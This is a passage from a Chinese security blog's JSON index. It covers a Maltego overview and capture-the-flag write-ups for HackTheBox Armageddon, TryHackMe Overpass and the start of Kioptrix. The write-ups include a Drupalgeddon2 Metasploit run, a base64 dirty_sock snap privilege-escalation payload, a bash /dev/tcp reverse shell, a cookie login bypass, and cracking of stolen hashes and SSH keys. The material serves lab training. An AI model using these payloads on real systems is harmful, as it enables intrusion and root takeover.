是一个非常强大的数据挖掘工具，它提供了无尽的搜索工具和策略组合。它的学习曲线可能很陡峭，坦率地说，它对这个模块来说是多余的，但其令人印象深刻的能力值得介绍一下。\n\nMaltego 搜索数以千计的在线数据源，并使用极其巧妙的“转换”来将一个信息转换为另一个信息。例如，如果我们正在进行一个用户信息收集活动，我们可以提交一个电子邮件地址，并通过各种自动搜索，将其“转化”为一个相关的电话号码或街道地址。在一次组织信息收集活动中，我们可以提交一个域名，将其“转化”为一个网络服务器，然后是电子邮件地址列表，然后是相关的社交媒体账户列表，然后是该电子邮件账户的潜在密码列表。\n\n组合是无穷无尽的，而且发现的信息以可扩展的图表形式呈现，允许轻松的缩放导航。\n\nMaltego CE（Maltego 有限的“社区版本”）包含在 Kali 中，需要免费注册才能使用。商业版本也有，可以处理更大的数据集。\n\n多个供应商提供的信息，Maltego 可以摄取和显示。然而，一些供应商也对其数据的访问进行收费。Maltego 不需要完成实验室中的任何材料，但它可以成为大型信息收集行动中不可缺少的工具。\n","tags":["OSCP"],"categories":["OSCP"]},{"title":"Armageddon - Hackthebox","url":"/2022/08/04/Hackthebox - Armageddon/","content":"\n# 靶场信息\n\n![image](image1.png)\n\n# 靶场类型\n\n![image](image2.png)\n\n# 信息搜集\n\n## NMAP\n\n首先使用nmap进行扫描\n\nnmap –A -sS –sC –Sv 10.10.10.233\n\n![image](image3.png)\n\n我们可以看到开启了22和80端口\n\n在80端口提示了我们存在robots.txt文件，并且东西很多 咱们访问一下\n\n![image](image4.png)\n\n其中引起我兴趣的东西呢就是/MAINTAINERS.txt文件了\n\n这是维护文件，或者说是升级文件，咱们打开看一下\n\n![image](image5.png)\n\n果不其然，里面揭露了Drupal的版本\n\n到这里思路就明了了\n\n# 漏洞利用\n\n咱们直接使用msf进行getshell\n\n使用msfconsole打开msf\n\n输入search drupal搜索可用的exp\n\n![image](image6.png)\n\n咱们对比一下版本号，最后一次升级为7.56版本，升级时间为2017-06-21 也就是说在这之前的exp都可以直接pass了\n\n咱们把目光放在2018-03-28的exp上\n\n```\nuse exploit/unix/webapp/drupal_drupalgeddon2\n\noption\n\nset RHOSTS 10.10.10.233\n\nset lhost 10.10.14.135\n\nexploit\n```\n\n![image](image7.png)\n\n成功获取到一个shell\n\n![image](image8.png)\n\n咱们运行一下无法查看到uid，但是可以查看到文件\n\n但我偏不，我就想知道当前用户怎么办？\n\n简单\n\n输入shell\n\n![image](image9.png)\n\n一开始我以为是卡住了，但后来想想不对，好像是获取到了\n\n![image](image10.png)\n\n执行命令后确认命令是可以被执行的？\n\n那咱们先想办法获得一个稳定的shell吧\n\n/bin/bash –i\n\n![image](image11.png)\n\n不一样被我搞到shell了，可给我NB坏了，叉会儿腰\n\n![image](image12.png)\n\n用户是apache，权限还是有点低啊，咱们在内核里看到了一个域名，或许有用，先记录下来吧，暂时还不知道是干嘛的，咱们得想想办法去搞到更高一点的权限\n\n我在查看源码和配置文件的时候，在../sites/default/settings.php中找到了数据库的账号密码\n\n![image](image13.png)\n\n```\ndatabase => drupal\n\nusername => drupaluser\n\npassword => CQHEy@9M*m23gBVj\n```\n\n他不是开启了22端口吗，咱们直接ssh登录吧\n\n![image](image14.png)\n\n嗯？密码不对？啊这，就有点尴尬了呀\n\n没事儿，咱们换一种方法，既然从外面来不行，那咱们就从里面来，咳咳 没开车哈 请不要脑补\n\n在咱们的shell里直接使用mysql进行登录\n\n![image](image15.png)\n\n很奇怪，正常输入账号密码会卡住或者报错或者出现一些奇怪的东西\n\n![image](image16.png)\n\n经过多方测试以及查找资料后，得出正确的查询命令\n\n```\nmysql -u \"drupaluser\" -h \"localhost\" \"-pCQHEy@9M*m23gBVj\" \"drupal\" -e \"select uid, name, pass from users;\"\n```\n\n![image](image17.png)\n\nbrucetherealadmin账户一看这么长就知道不简单，俗话说的好，长的人一定不简单，咋办？爆它！\n\n将用户brucetherealadmin的hash保存为一个文本文件\n\n![image](image18.png)\n\n请出我们的神器john\n\n```\njohn --wordlist=/usr/share/wordlists/rockyou.txt admin\n```\n\n爆破成功\n\n![image](image19.png)\n\n密码为booboo\n\n现在咱们直接ssh登录就可以了\n\nssh [brucetherealadmin@10.10.10.233](mailto:brucetherealadmin@10.10.10.233)\n\n![image](image20.png)\n\nOK，咱们现在总算是有一个完整的用户权限了\n\n![image](image21.png)\n\n成功获得user权限的flag\n\n**权限提升**\n\n咱们使用sudo –l来查看一下sudo权限\n\n![image](image22.png)\n\n咱们可以不使用密码就调用root权限安装snap，那思路就有了呀，搞起来兄弟们\n\n生成一个snap的马\n\n参考链接：\n\n> Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)：https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html\n\n> Playing with Dirty Sock：https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html\n\n生成指令：\n\n```\npython2 -c 'print\"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\"+ \"A\"*4256 + \"==\"' | base64 -d > exploit.snap\n```\n\n![image](image23.png)\n\n直接运行改文件，发现还有一点错误，需要想办法解决一下\n\n![image](image24.png)\n\n加上 --devmode 成功安装\n\nsudo /usr/bin/snap install --devmode exploit.snap\n\n![image](image25.png)\n\n切换到dirty_sock用户，密码也是dirty_sock\n\n查看一下权限\n\n![image](image26.png)\n\n提权成功\n\n![image](image27.png)\n\n成功拿到root权限的flag\n","tags":["Hackthebox"]},{"title":"Overpass - TryHackMe","url":"/2022/05/05/TryHackMe  - Overpass/","content":"\n# 靶场介绍\n\n当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次*完美*的商业成功！\n\n这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？\n\n更新：该代码现已声明。机器于 2020/09/25 稍作修改。这只是为了提高机器的性能。它不影响该过程。\n\n# 靶场地址\n\n[https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)\n\n# 信息收集\n\n## Nmap\n\n```bash\n┌──(root💀lucifiel)-[~]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST\nNmap scan report for 10.10.29.27\nHost is up (0.15s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)\n|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)\n|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Overpass\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(\nOS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT       ADDRESS\n1   151.63 ms 10.18.0.1\n2   152.12 ms 10.10.29.27\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.80 seconds\n```\n\n## HTTP\n\n![image](image.png)\n\n没什么有用的东西，去 FUZZ 一下\n\n## FUZZ\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.29.27/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/05/05 07:54:43 Starting gobuster in directory enumeration mode\n===============================================================\n/img                  (Status: 301) [Size: 0] [--> img/]\n/downloads            (Status: 301) [Size: 0] [--> downloads/]\n/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  \n/admin                (Status: 301) [Size: 42] [--> /admin/]  \n/css                  (Status: 301) [Size: 0] [--> css/]\n```\n\n有一个 /admin 目录，进去看一下\n\n![image](image1.png)\n\n一个登陆页面，使用弱口令没有进去，看一下源代码\n\n在页面 [http://10.10.29.27/login.js](http://10.10.29.27/login.js) 中找到了一句\n\n```bash\nCookies.set(\"SessionToken\",statusOrCookie)\n```\n\n同时在 [http://10.10.29.27/main.js](http://10.10.29.27/main.js) 还有一个内容\n\n```bash\nconsole.log(\"Hello, World!\")\n```\n\n这里应该是 Cookie 设置绕过\n\n# 漏洞利用\n\n按 F12 打开控制台\n\n![image](image2.png)\n\n这里也确实输出了 “Hello, World”\n\n这里修改我们的 Payload\n\n```bash\nCookies.set(\"SessionToken\", \"\")\n```\n\n在控制台输入以后，刷新\n\n![image](image3.png)\n\n直接绕过了登陆机制，拿到了用户 james 的 sshkey\n\n```bash\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337\n\nLNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN\nJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal\n73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT\nWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv\nBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ\nAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR\n3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf\nABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk\nVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR\nOkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P\n9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze\neaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ\n4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8\nGFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn\nexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy\nAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk\n6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58\ndPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i\nn0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT\n8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K\n4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z\nylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS\n49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2\n+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk\n2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7\n-----END RSA PRIVATE KEY-----\n```\n\n将 sshkey 保存到 id_rsa 中，并给予权限\n\n```bash\nchmod 600 id_rsa\n```\n\n接着使用 ssh 进行登陆\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# ssh james@10.10.84.23 -i id_rsa\nThe authenticity of host '10.10.84.23 (10.10.84.23)' can't be established.\nECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.84.23' (ECDSA) to the list of known hosts.\nEnter passphrase for key 'id_rsa':\n```\n\n显示需要输入密码，去破解一下\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# ssh2john id_rsa > hash\n\n┌──(root💀lucifiel)-[~/Desktop]\n└─# cat hash\nid_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b\n```\n\n然后使用 john 进行爆破\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 ⨯\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\njames13          (id_rsa)\n1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\n这里爆破出来了密码为 james13 去就进行连接\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# ssh james@10.10.84.23 -i id_rsa\nEnter passphrase for key 'id_rsa':\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu May  5 12:32:51 UTC 2022\n\n  System load:  0.09               Processes:           92\n  Usage of /:   22.3% of 18.57GB   Users logged in:     0\n  Memory usage: 12%                IP address for eth0: 10.10.84.23\n  Swap usage:   0%\n\n47 packages can be updated.\n0 updates are security updates.\n\nLast login: Sat Jun 27 04:45:40 2020 from 192.168.170.1\njames@overpass-prod:~$ whoami&&id\njames\nuid=1001(james) gid=1001(james) groups=1001(james)\n```\n\n成功拿到 user 权限\n\n```bash\njames@overpass-prod:~$ ls\ntodo.txt  user.txt\njames@overpass-prod:~$ cat user.txt\nthm{65c1aaf000506e56996822c6281e6bf7}\n```\n\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n\n```bash\njames@overpass-prod:~$ cat todo.txt\nTo Do:\n> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough\n> Write down my password somewhere on a sticky note so that I don't forget it.\n  Wait, we make a password manager. Why don't I just use that?\n> Test Overpass for macOS, it builds fine but I'm not sure it actually works\n> Ask Paradox how he got the automated build script working and where the builds go.\n  They're not updating on the website\n```\n\n这有个 todo.txt 文件作为提示，不过我英语不好，也不确定说的啥，还是先跑个 LinPeas 看看吧\n\n```bash\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash\n```\n\n这里看到一个，root 会使用 curl 向 overpass.htm/downloads/src/buildscrit.sh 请求内容，然后使用 bash 执行\n\n```bash\n╔══════════╣ Hostname, hosts and DNS\noverpass-prod\n127.0.0.1 localhost\n127.0.1.1 overpass-prod\n127.0.0.1 overpass.thm\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\nnameserver 127.0.0.53\noptions edns0\nsearch eu-west-1.compute.internal\n```\n\n然后在这里可以看到 overpass.htm 是指向的 127.0.0.1\n\n```bash\njames@overpass-prod:~$ ls -la /etc/hosts\n-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts\n```\n\n这里可以看到，我们是有权限修改 /etc/hosts 的内容的\n\n那提权思路就有了\n\n首先创建指定的目录和脚本\n\n```bash\nmkdir -p downloads/src && vim downloads/src/buildscript.sh\n```\n\n然后写入我们的 payload\n\n```bash\nbash -c 'exec bash -i &>/dev/tcp/10.18.112.117/4444 <&1'\n```\n\n接着需要两个窗口\n\n第一个窗口 使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n\n第二个窗口 使用 python3 开启一个 http 服务\n\n```bash\npython3 -m http.server 80\n```\n\n然后去 shell 里修改 /etc/hosts 的内容\n\n```bash\n10.18.112.117 overpass.thm\n```\n\n把第三行改成这样，然后等着就行了\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.84.23 - - [05/May/2022 09:17:01] \"GET /downloads/src/buildscript.sh HTTP/1.1\" 200 -\n```\n\n成功下载了我们的 payload\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604\nbash: cannot set terminal process group (16146): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@overpass-prod:~# whoami&&id\nwhoami&&id                                                                                                                                    \nroot                                                                                                                                          \nuid=0(root) gid=0(root) groups=0(root)\n```\n\n成功拿到了 root 权限\n\n```bash\nroot@overpass-prod:~# ls                                                                                                                      \nls                                                                                                                                            \nbuildStatus                                                                                                                                   \nbuilds                                                                                                                                        \ndownloads                                                                                                                                     \ngo                                                                                                                                            \nroot.txt                                                                                                                                      \nsrc                                                                                                                                           \nroot@overpass-prod:~# cat root.txt                                                                                                            \ncat root.txt                                                                                                                                  \nthm{7f336f8c359dbac18d54fdd64ea753bb}\n```\n\n成功拿到了 root 权限的 flag 文件\n","tags":["TryHackMe"]},{"title":"Kioptrix Level 1 - Vulnhub","url":"/2021/11/13/Vulnhub  - Kioptrix/","content":"\n## 靶场信息\n\n```\nThis Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.\n这个Kioptrix VM Image是很容易的挑战。游戏的目的是通过任何可能的手段获得root权限（除了实际入侵VM服务器或玩家）。这些游戏的目的是学习漏洞评估和利用方面的基本工具和技术。成功完成这些挑战的方法有很多。\n```\n\n```\n下载地址\nhttps://www.vulnhub.com/entry/kioptrix-level-1-1,22/\n```\n\n## 信息搜集\n\n首先使用arp获取靶机的IP地址\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106\nStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.\n\n9 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded\n```\n\n确定靶机IP地址为192.168.1.102，使用nmap进行端口扫描\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST\nNmap scan report for 192.168.1.102\nHost is up (0.00042s latency).\nNot shown: 65529 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey:\n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-09-26T09:32:06\n|_Not valid after:  2010-09-26T09:32:06\n|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|_    SSL2_DES_64_CBC_WITH_MD5\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:55:CB:15 (VMware)\nDevice type: general purpose\nRunning: Linux 2.4.X\nOS CPE: cpe:/o:linux:linux_kernel:2.4\nOS 